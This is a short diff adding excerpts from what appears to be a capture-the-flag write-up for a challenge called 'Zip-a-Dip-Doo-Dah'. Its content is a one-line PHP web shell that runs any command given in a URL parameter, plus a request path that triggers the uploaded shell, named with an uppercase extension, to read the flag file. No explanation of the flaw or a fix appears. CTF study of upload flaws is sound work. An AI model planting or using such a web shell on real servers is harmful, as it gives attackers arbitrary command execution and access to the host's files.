@@ -1,0 +1,8 @@
+# Zip-a-Dip-Doo-Dah
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Upload and trigger the shell (php)
+<?php system($_GET['c'] ?? 'id'); ?>
+
+## Upload and trigger the shell (text)
+/uploads/<id>/shell.PHP?c=cat+/flag.txt
